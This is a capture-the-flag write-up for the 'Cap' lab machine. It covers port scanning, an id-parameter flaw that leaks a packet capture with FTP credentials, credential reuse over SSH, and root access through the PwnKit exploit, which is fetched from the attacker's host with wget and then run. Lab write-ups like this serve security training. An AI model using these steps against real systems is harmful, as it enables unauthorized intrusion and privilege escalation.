
---

## 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.

```bash
nmap -sV cap.htb
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-02 14:35 +0200
Nmap scan report for cap.htb (10.129.92.208)
Host is up (0.026s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain?
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. Enumeration

While exploring the website, I found a page that allowed downloading a network capture, but it was empty. I noticed that the URL contained an id parameter, so I changed it.

When I set the id to 0, I got a network capture containing actual data, so I downloaded it.

Inside the capture, I found a username and password for the FTP server:

```
username : nathan
password : Buck3tH4TF0RM3!
```

## 3. Foothold

Once logged in via FTP, I saw a file named `user.txt`, so I downloaded and opened it:

```bash
ftp cap.htb
```

```
Connected to cap.htb.
220 (vsFTPd 3.0.3)
Name (cap.htb:root): nathan
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r-------- 1 1001 1001 33 Sep 02 12:28 user.txt
226 Directory send OK.
ftp> get user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
```

## 4. User Flag

```
cat user.txt
2225a505dd296583d6f8c286740caeb2
```

I tried the same FTP credentials (`nathan` / `Buck3tH4TF0RM3!`) for the SSH service, and it worked.

## 5. Privilege Escalation

I checked for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
```

`pkexec` looked like a promising lead, so I checked its version:

```bash
pkexec --version
```

```
pkexec version 0.105
```

Version 0.105 is vulnerable to PwnKit (CVE-2021-4034).

I cloned the PwnKit repo on my machine and started a server so the target machine could reach it:

```bash
git clone https://github.com/ly4k/PwnKit
cd PwnKit
python3 -m http.server 8000
```

Then, on the target machine, I downloaded PwnKit using wget:

```bash
wget http://10.10.15.126:8000/PwnKit -O /tmp/PwnKit
```

Finally, I launched the exploit:

```bash
chmod +x /tmp/PwnKit
/tmp/PwnKit
```

```
root@cap:/home/nathan# id
uid=0(root) gid=0(root) groups=0(root)
```

## 6. Root Flag

```bash
root@cap:~# cat root.txt
e8d87cf71eb9cc1e747b764fc249a746
```

